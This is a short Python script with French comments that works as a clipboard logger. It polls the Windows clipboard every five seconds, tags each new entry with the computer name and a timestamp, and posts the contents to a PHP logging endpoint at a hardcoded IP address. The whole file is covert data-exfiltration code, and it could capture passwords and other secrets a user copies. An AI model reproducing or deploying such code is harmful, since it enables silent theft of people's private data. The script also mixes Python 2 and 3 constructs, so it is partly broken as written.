# coding:utf-8
# pip install pywin32
import win32clipboard as clip
import requests
import time
import os

date = time.strftime("%Y%m%d_%H%M%S")
pc_name = os.environ['COMPUTERNAME']
clip_name = pc_name + "_" + date + '\n'
global clip_name

def get_clip():
    # Variables
    global data
    clip.OpenClipboard()                                        # Ouverture du Clipboard
    data = clip.GetClipboardData()                              # Récupération du contenu du clipboard
    clip.CloseClipboard()                                       # Fermeture du clipboard pour ne pas impacter la fonction
 #   data = data.replace('\n', '|| ')


def send(data):
    # AVEC REQUESTS
    url = 'http://192.168.35.68:8080/logger.php?log='
    url_log = url + clip_name + data
    res = requests.post(url_log, data.decode("utf-8"))
    print(res.text)

def main():
    dataSent = 'lol'
    while True:
        get_clip()
        print data + dataSent
        if data != dataSent:
            dataSent = data
            send(data)
        time.sleep(5)

main()
